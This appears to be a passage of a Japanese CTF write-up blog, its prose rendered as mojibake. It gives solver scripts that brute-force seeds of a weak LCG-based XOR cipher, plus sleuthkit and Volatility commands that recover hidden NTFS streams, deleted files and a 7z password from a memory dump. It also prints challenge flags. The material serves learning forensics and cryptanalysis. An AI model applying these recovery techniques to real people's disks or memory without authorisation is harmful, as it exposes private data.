<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% python solve.py</span><br><span class="line"><span class="string">b&#x27;\x02\xb0\xf9\x92\x16M\x1fN\x0f\xcd\xd5Bl\x00**flag&#123;X0Myx6IHI8&#125;**\n&#x27;</span></span><br></pre></td></tr></table></figure>

<aside>
â›³ flag{X0Myx6IHI8}

</aside>

<h3><span id="cryptographically-insecure-prng">Cryptographically Insecure PRNG</span></h3><img src="/img/2024/02-25/Untitled%2010.png" width="550px" height="auto">

<p>XORã«ä½¿ã†éµã¯ã€4ãƒã‚¤ãƒˆã®ã‚·ãƒ¼ãƒ‰ã•ãˆæ±ºã¾ã‚Œã°ä¸€æ„ã«å®šã¾ã‚‹ã€‚ãŸã ã—ä»»æ„4ãƒã‚¤ãƒˆã¯ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ã«ã¯å¤šã™ãã‚‹ã®ã§ã€çµã‚Šè¾¼ã¿ãŸã„ã€‚</p>
<p>æœ€åˆã®4æ–‡å­—ãŒè‹±å­—ã§ã‚ã‚‹ã“ã¨ãŒæœŸå¾…ã•ã‚Œã‚‹ã®ã§ã€ãã®ã‚ˆã†ãªæ¡ä»¶ã‚’æº€ãŸã™ã‚ˆã†ãªã‚·ãƒ¼ãƒ‰ã‚’ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã™ã‚‹ã“ã¨ã¨ã™ã‚‹ã€‚ä»¥ä¸‹ã® <code>seedlist.py</code> ï¼ˆè©¦è¡ŒéŒ¯èª¤ã‚†ãˆã‚ã¡ã‚ƒæ±šã„ï¼‰ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€ <code>seedlist.hex</code> ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚·ãƒ¼ãƒ‰å€™è£œãŸã¡ãŒ1è¡Œãšã¤æ›¸ã‹ã‚Œã‚‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mk_seed</span>(<span class="params">ciphertext, ascii4</span>):</span><br><span class="line">    ascii4_long = bytes_to_long(<span class="built_in">bytes</span>(ascii4, <span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line">    seed_bytes = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        seed_bytes = <span class="built_in">bytes</span>([ciphertext[j] ^ ((ascii4_long &gt;&gt; ((<span class="number">3</span> - j) * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>)]) + seed_bytes</span><br><span class="line">    <span class="keyword">return</span> seed_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read the encrypted file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;PRNG.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ã‚¢ãƒ«ãƒ•ã‚¡ãƒ™ãƒƒãƒˆã®ãƒªã‚¹ãƒˆã‚’ä½œæˆ</span></span><br><span class="line">alphabet = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>), <span class="built_in">ord</span>(<span class="string">&quot;z&quot;</span>) + <span class="number">1</span>)] + [</span><br><span class="line">    <span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>), <span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>) + <span class="number">1</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4æ–‡å­—ã®çµ„ã¿åˆã‚ã›ã‚’ç”Ÿæˆ</span></span><br><span class="line">combinations = itertools.product(alphabet, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;seedlist.hex&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ãƒ«ãƒ¼ãƒ—ã§çµ„ã¿åˆã‚ã›ã‚’å‡¦ç†</span></span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> combinations:</span><br><span class="line">        <span class="comment"># æ–‡å­—åˆ—ã«å¤‰æ›ã—ã¦å‡ºåŠ›</span></span><br><span class="line">        ascii4 = <span class="string">&quot;&quot;</span>.join(combo)</span><br><span class="line">        seed = mk_seed(ciphertext, ascii4)</span><br><span class="line">        seed_hex = <span class="built_in">bytes</span>.<span class="built_in">hex</span>(seed)</span><br><span class="line">        <span class="built_in">print</span>(ascii4, seed_hex)</span><br><span class="line">        f.write(<span class="string">f&quot;<span class="subst">&#123;seed_hex&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>ã“ã®ã‚·ãƒ¼ãƒ‰ã‚’ä½¿ã£ã¦å¾©å·ã‚’è©¦ã¿ã‚‹ã€‚å¾©å·çµæœã«ã¯ <code>flag</code> ã®æ–‡å­—åˆ—ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã¯ãšãªã®ã§ã€å¾©å·çµæœã«ãã‚ŒãŒå«ã¾ã‚Œã¦ã„ãŸã‚‰ <code>decrypted-seed-&#123;ãã®æ™‚ã®seed&#125;.txt</code> ã«å¾©å·çµæœå…¨æ–‡ãŒæ›¸ãè¾¼ã¾ã‚Œã‚‹ã‚ˆã†ãªã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’æ›¸ã„ãŸï¼ˆã“ã‚Œã¾ãŸæ±šã„â€¦ï¼‰ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_first_4bytes</span>(<span class="params">ciphertext, seed</span>):</span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        plaintext += <span class="built_in">chr</span>(ciphertext[j] ^ ((seed &gt;&gt; (j * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>))</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, prng</span>):</span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">4</span>):</span><br><span class="line">        xor_val = <span class="built_in">next</span>(prng)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="comment"># print(f&quot;i: &#123;i&#125;, j: &#123;j&#125;, xor_val: &#123;xor_val&#125;&quot;)</span></span><br><span class="line">            <span class="keyword">if</span> i + j &lt; <span class="built_in">len</span>(ciphertext):</span><br><span class="line">                plaintext += <span class="built_in">chr</span>(ciphertext[i + j] ^ ((xor_val &gt;&gt; (j * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>))</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcg</span>(<span class="params">m=<span class="number">4294967296</span>, a=<span class="number">233</span>, c=<span class="number">653</span>, seed=<span class="number">0</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Linear congruential generator&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> seed</span><br><span class="line">        seed = (a * seed + c) % m</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read the encrypted file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;PRNG.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;seedlist.hex&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> seed_hex <span class="keyword">in</span> f:</span><br><span class="line">        seed = <span class="built_in">int</span>(seed_hex.strip(), <span class="number">16</span>)</span><br><span class="line">        first_4bytes = decrypt_first_4bytes(ciphertext, seed)</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;[progress] seed: &#123;:08X&#125;, first_4bytes: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                seed, first_4bytes.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> first_4bytes.isalpha()</span><br><span class="line"></span><br><span class="line">        prng = lcg(seed=seed)</span><br><span class="line">        plaintext = decrypt(ciphertext, prng)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> plaintext <span class="keyword">or</span> <span class="string">&quot;FLAG&quot;</span> <span class="keyword">in</span> plaintext <span class="keyword">or</span> <span class="string">&quot;Flag&quot;</span> <span class="keyword">in</span> plaintext:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[Hit ASCII!] seed: <span class="subst">&#123;seed&#125;</span>, plaintext: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;decrypted-seed-<span class="subst">&#123;seed&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">                f2.write(plaintext)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ã‚·ãƒ¼ãƒ‰ãŒ10é€²æ•°ã§ 2638296720 ã®ã¨ãã€ä»¥ä¸‹ã®å¹³æ–‡ãŒå¾—ã‚‰ã‚Œã‚‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Against selection release between gray knowledge. To interest trot versus protective morning. Round death annoy on interesting bat. Inside finger zip of jolly skate. Opposite flavor exercise of husky quiet. Minus plate include despite whole development. Below society desert than kindhearted head. To shirt guarantee anti steadfast secretary. Beneath tree laugh like romantic expert. To sisters end below hallowed carriage. **flag&#123;QVFE5i5LkZdR&#125;** Inside hook point into depressed hate. Past act reply anti quarrelsome stove. Aboard badge memorize amid vagabond farm. On riddle request without offbeat pets. At mouth object above present ink. Near curve stroke in garrulous trouble. Anti country answer through swift talk. Over test escape into puzzling crook. Than stream waste near uneven ants. About fireman choke along defective base.</span><br></pre></td></tr></table></figure>

<aside>
â›³ flag{QVFE5i5LkZdR}

</aside>

<h2><span id="forensics">Forensics</span></h2><h3><span id="ntfs-data-hide">NTFS Data Hide</span></h3><img src="/img/2024/02-25/Untitled%2011.png" width="550px" height="auto">

<p>FTK Imagerã‚’åˆã‚ã¦ä½¿ã£ã¦ã¿ãŸãŒã€ä¸‹æ‰‹ããã§ã†ã¾ãã„ã‹ãªã‹ã£ãŸ ğŸ˜‡</p>
<p>è‡ªåˆ†ãƒ¡ãƒ¢ã® <a target="_blank" rel="noopener" href="https://laysakura.notion.site/CTF-forensics-bb9a10ec17134b6c86ba5cd91c4f33d1#d96978e1f5864cf9b7d15a502a6f93cd">sleuthkit åŸºæœ¬ä»•è‰ - Notion</a> ã‚ãŸã‚Šã‚’èª­ã¿ã¤ã¤ sleuthkit ã§ã‚„ã£ã¦ã„ãã€‚</p>
<hr>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">% fls -o 0000000128 NTFS.vhd</span><br><span class="line">r/r 4-128-1:    <span class="variable">$AttrDef</span></span><br><span class="line">r/r 8-128-2:    <span class="variable">$BadClus</span></span><br><span class="line">r/r 8-128-1:    <span class="variable">$BadClus</span>:<span class="variable">$Bad</span></span><br><span class="line">r/r 6-128-4:    <span class="variable">$Bitmap</span></span><br><span class="line">r/r 7-128-1:    <span class="variable">$Boot</span></span><br><span class="line">d/d 11-144-4:   <span class="variable">$Extend</span></span><br><span class="line">r/r 2-128-1:    <span class="variable">$LogFile</span></span><br><span class="line">r/r 0-128-6:    <span class="variable">$MFT</span></span><br><span class="line">r/r 1-128-1:    <span class="variable">$MFTMirr</span></span><br><span class="line">d/d 49-144-1:   <span class="variable">$RECYCLE</span>.BIN</span><br><span class="line">r/r 9-128-8:    <span class="variable">$Secure</span>:<span class="variable">$SDS</span></span><br><span class="line">r/r 9-144-11:   <span class="variable">$Secure</span>:<span class="variable">$SDH</span></span><br><span class="line">r/r 9-144-14:   <span class="variable">$Secure</span>:<span class="variable">$SII</span></span><br><span class="line">r/r 10-128-1:   <span class="variable">$UpCase</span></span><br><span class="line">r/r 10-128-4:   <span class="variable">$UpCase</span>:<span class="variable">$Info</span></span><br><span class="line">r/r 3-128-3:    <span class="variable">$Volume</span></span><br><span class="line">d/d 39-144-1:   NTFSDataHide</span><br><span class="line">d/d 41-144-1:   NTFSFileDelete</span><br><span class="line">d/d 40-144-1:   NTFSFileRename</span><br><span class="line">d/d 36-144-5:   System Volume Information</span><br><span class="line">V/V 256:        <span class="variable">$OrphanFiles</span></span><br><span class="line"></span><br><span class="line">% fls -o 0000000128 NTFS.vhd 39-144-1</span><br><span class="line">r/r 42-128-3:   Sample.pptx</span><br><span class="line">r/r 42-128-5:   Sample.pptx:script</span><br><span class="line"></span><br><span class="line">% icat -o 0000000128 -r NTFS.vhd 42-128-5</span><br><span class="line"><span class="string">&quot;[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;**ZmxhZ3tkYXRhX2Nhbl9iZV9oaWRkZW5faW5fYWRzfQ==**&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<p>Base64ãŒå‡ºã¦ããŸã®ã§CyberChefã€‚</p>
<img src="/img/2024/02-25/Untitled%2012.png" width="auto" height="auto">

<aside>
â›³ flag{data_can_be_hidden_in_ads}

</aside>

<h3><span id="ntfs-file-delete">NTFS File Delete</span></h3><img src="/img/2024/02-25/Untitled%2013.png" width="550px" height="auto">

<p>å‰å•ã¨åŒæ§˜ã« sleuthkit ã§ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">% fls -o 0000000128 NTFS.vhd</span><br><span class="line">r/r 4-128-1:    <span class="variable">$AttrDef</span></span><br><span class="line">r/r 8-128-2:    <span class="variable">$BadClus</span></span><br><span class="line">r/r 8-128-1:    <span class="variable">$BadClus</span>:<span class="variable">$Bad</span></span><br><span class="line">r/r 6-128-4:    <span class="variable">$Bitmap</span></span><br><span class="line">r/r 7-128-1:    <span class="variable">$Boot</span></span><br><span class="line">d/d 11-144-4:   <span class="variable">$Extend</span></span><br><span class="line">r/r 2-128-1:    <span class="variable">$LogFile</span></span><br><span class="line">r/r 0-128-6:    <span class="variable">$MFT</span></span><br><span class="line">r/r 1-128-1:    <span class="variable">$MFTMirr</span></span><br><span class="line">d/d 49-144-1:   <span class="variable">$RECYCLE</span>.BIN</span><br><span class="line">r/r 9-128-8:    <span class="variable">$Secure</span>:<span class="variable">$SDS</span></span><br><span class="line">r/r 9-144-11:   <span class="variable">$Secure</span>:<span class="variable">$SDH</span></span><br><span class="line">r/r 9-144-14:   <span class="variable">$Secure</span>:<span class="variable">$SII</span></span><br><span class="line">r/r 10-128-1:   <span class="variable">$UpCase</span></span><br><span class="line">r/r 10-128-4:   <span class="variable">$UpCase</span>:<span class="variable">$Info</span></span><br><span class="line">r/r 3-128-3:    <span class="variable">$Volume</span></span><br><span class="line">d/d 39-144-1:   NTFSDataHide</span><br><span class="line">d/d 41-144-1:   NTFSFileDelete</span><br><span class="line">d/d 40-144-1:   NTFSFileRename</span><br><span class="line">d/d 36-144-5:   System Volume Information</span><br><span class="line">V/V 256:        <span class="variable">$OrphanFiles</span></span><br><span class="line"></span><br><span class="line">% fls -o 0000000128 NTFS.vhd 41-144-1</span><br><span class="line">r/r 48-128-1:   Sample.txt</span><br><span class="line">-/r * 52-128-1: flag.txt</span><br><span class="line"></span><br><span class="line">% icat -o 0000000128 -r NTFS.vhd 52-128-1</span><br><span class="line">**flag&#123;resident_in_mft&#125;**</span><br></pre></td></tr></table></figure>

<aside>
â›³ flag{resident_in_mft}

</aside>

<h3><span id="ntfs-file-rename">NTFS File Rename</span></h3><img src="/img/2024/02-25/Untitled%2014.png" width="550px" height="auto">

<p><code>$MFT</code> ã‹ã‚‰å±¥æ­´è¾¿ã‚ã†ã¨æ€ã£ãŸã‘ã©ãƒ•ã‚¡ã‚¤ãƒ«åã‚ã‹ã‚‰ãªã‹ã£ãŸã€‚ãƒ’ãƒ³ãƒˆè¦‹ãŸã€‚</p>
<blockquote>
<p>NTFS ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã¯ã‚·ã‚™ãƒ£ãƒ¼ãƒŠãƒªãƒ³ã‚¯ã‚™ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã¦ã‚™ã€<strong>NTFS Log</strong> ã‚„ USN ã‚·ã‚™ãƒ£ãƒ¼ãƒŠãƒ«ã«ãƒ•ã‚¡ã‚¤ãƒ«ã®å¤‰æ›´å±¥æ­´ã‹ã‚™è¨˜éŒ²ã•ã‚Œã¦ã„ã¾ã™ã€‚</p>
</blockquote>
<p>sleuthkit ã§ <code>$LogFile</code> ã‚’ã‚²ãƒƒãƒˆã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">% fls -o 0000000128 NTFS.vhd</span><br><span class="line">r/r 4-128-1:    <span class="variable">$AttrDef</span></span><br><span class="line">r/r 8-128-2:    <span class="variable">$BadClus</span></span><br><span class="line">r/r 8-128-1:    <span class="variable">$BadClus</span>:<span class="variable">$Bad</span></span><br><span class="line">r/r 6-128-4:    <span class="variable">$Bitmap</span></span><br><span class="line">r/r 7-128-1:    <span class="variable">$Boot</span></span><br><span class="line">d/d 11-144-4:   <span class="variable">$Extend</span></span><br><span class="line">r/r 2-128-1:    <span class="variable">$LogFile</span></span><br><span class="line">r/r 0-128-6:    <span class="variable">$MFT</span></span><br><span class="line">r/r 1-128-1:    <span class="variable">$MFTMirr</span></span><br><span class="line">d/d 49-144-1:   <span class="variable">$RECYCLE</span>.BIN</span><br><span class="line">r/r 9-128-8:    <span class="variable">$Secure</span>:<span class="variable">$SDS</span></span><br><span class="line">r/r 9-144-11:   <span class="variable">$Secure</span>:<span class="variable">$SDH</span></span><br><span class="line">r/r 9-144-14:   <span class="variable">$Secure</span>:<span class="variable">$SII</span></span><br><span class="line">r/r 10-128-1:   <span class="variable">$UpCase</span></span><br><span class="line">r/r 10-128-4:   <span class="variable">$UpCase</span>:<span class="variable">$Info</span></span><br><span class="line">r/r 3-128-3:    <span class="variable">$Volume</span></span><br><span class="line">d/d 39-144-1:   NTFSDataHide</span><br><span class="line">d/d 41-144-1:   NTFSFileDelete</span><br><span class="line">d/d 40-144-1:   NTFSFileRename</span><br><span class="line">d/d 36-144-5:   System Volume Information</span><br><span class="line">V/V 256:        <span class="variable">$OrphanFiles</span></span><br><span class="line"></span><br><span class="line">% icat -o 0000000128 -r NTFS.vhd 2-128-1 &gt; LogFile</span><br></pre></td></tr></table></figure>

<p>Windowsã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚ã‚ŠãŒã¡ãª2ãƒã‚¤ãƒˆã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã«æ°—ã‚’ã¤ã‘ã¤ã¤ strings ã§ãƒã‚§ãƒƒã‚¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">% strings -e l LogFile |grep docx</span><br><span class="line">werful.docx</span><br><span class="line"><span class="string">&quot;**journaling_system_is_powerful.docx**</span></span><br><span class="line"><span class="string">owerful.docx</span></span><br><span class="line"><span class="string">&quot;</span>journaling_system_is_powerful.docx</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<aside>
â›³ flag{journaling_system_is_powerful}

</aside>

<h3><span id="hidden-variable">HiddEN Variable</span></h3><img src="/img/2024/02-25/Untitled%2015.png" width="550px" height="auto">

<p>ãƒ¡ãƒ¢ãƒªãƒ•ã‚©ãƒ¬ãƒ³ã‚¸ãƒƒã‚¯ï¼åˆã‚ã¦ãªã‚“ã ã‚ˆãªãâ€¦</p>
<p>ã‚¿ã‚¤ãƒˆãƒ«ã‹ã‚‰ã—ã¦ç’°å¢ƒå¤‰æ•°ã‚’è¦‹ãŸãã†ã€‚ã‚°ã‚°ã‚‹ã¨ Volatility ã¨ã‹ã„ã†ã®ã‚’ä½¿ã†ã¨è‰¯ã„ã¨ã‹ã€‚æœ¬å½“ã¯2ã¨ã‹3ã®ä½¿ã„æ–¹ã§æ»…èŒ¶è‹¦èŒ¶è‹¦åŠ´ã—ãŸã‘ã©ã€ã‚µãƒ©ãƒƒã¨è¦ç‚¹ã‚’æ›¸ãã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">% vol.py -f ~/tmp/forensics/memdump.raw windows.envars.Envars &gt; Envars.txt</span><br><span class="line"></span><br><span class="line">% ag flag</span><br><span class="line">Envars.txt</span><br><span class="line">1298:2816       sihost.exe      0x1747e0e2010   FLAG    **BDkPUNzMM3VHthkj2cVEjdRBqTJcfLMJaxT9si67RgJZ45PS**</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;BDkPUNzMM3VHthkj2cVEjdRBqTJcfLMJaxT9si67RgJZ45PS&#125;</code> ã‹ãªï¼Ÿï¾–ï½¼! ã¨æ€ã£ãŸã‘ã©é€šã‚‰ãªã„ã€‚ã“ã“ã§è©¦è¡ŒéŒ¯èª¤æ²¼ã«ãƒãƒã‚Š30åˆ†ä»¥ä¸Šæã—ãŸãŒã€CyberChefã«å…¥ã‚ŒãŸã‚‰æ•™ãˆã¦ãã‚ŒãŸã€‚</p>
<img src="/img/2024/02-25/Untitled%2016.png" width="auto" height="auto">

<p>æ‚”ã—ã€œã€œã€œã€œã€œã€œã€œã€œã€œã€œ</p>
<aside>
â›³ flag{volatile_environment_variable}

</aside>

<h3><span id="my-secret">My Secret</span></h3><img src="/img/2024/02-25/Untitled%2017.png" width="550px" height="auto">

<p>å–ã£æ›ã‹ã‚ŠãŒã‚ã¾ã‚Šãªã„ &amp; æ®‹ã‚Šæ™‚é–“ã‚‚å°‘ãªããªã£ã¦ãã¦ã„ãŸã®ã§ãƒ’ãƒ³ãƒˆã‚’è¦‹ãŸã€‚</p>
<blockquote>
<p>7-Zip ã¨ã„ã†ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã¦ã‚™ä½•ã‹ã‚’è¡Œã£ã¦ã„ã‚‹ã‚ˆã†ã¦ã‚™ã™ã€‚</p>
</blockquote>
<p>ã˜ã‚ƒã‚ãƒ—ãƒ­ã‚»ã‚¹çµã£ã¦è§£æã ãªã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">% vol.py -f ~/tmp/forensics/memdump.raw windows.pslist &gt; pslist.txt</span><br><span class="line"></span><br><span class="line">% grep <span class="string">&#x27;7z&#x27;</span> pslist.txt</span><br><span class="line">**5516**    3468    7z.exe  0xe206bb303080  4       -       1       False   2023-12-26 00:51:23.000000      N/A     Disabled</span><br><span class="line"><span class="comment"># PIDãŒ5516</span></span><br><span class="line"></span><br><span class="line">% vol.py -f ~/tmp/forensics/memdump.raw windows.cmdline --pid 5516</span><br><span class="line">Volatility 3 Framework 2.6.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">PID     Process Args</span><br><span class="line"></span><br><span class="line">5516    7z.exe  7z  x -p**Y0uCanF1ndTh1sPa$<span class="variable">$w0rd</span>** C:\Users\vauser\Documents\**Secrets.7z** -<span class="built_in">od</span>:\</span><br><span class="line"></span><br><span class="line">% vol.py -f ~/tmp/forensics/memdump.raw -o .  windows.dumpfiles --pid 5516</span><br><span class="line">Volatility 3 Framework 2.6.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">Cache   FileObject      FileName        Result</span><br><span class="line"></span><br><span class="line">DataSectionObject       0xe206bbc4a2f0  Secrets.7z      Error dumping file</span><br><span class="line">SharedCacheMap  0xe206bbc4a2f0  **Secrets.7z**      file.0xe206bbc4a2f0.0xe206bbabada0.SharedCacheMap.Secrets.7z.vacb</span><br></pre></td></tr></table></figure>

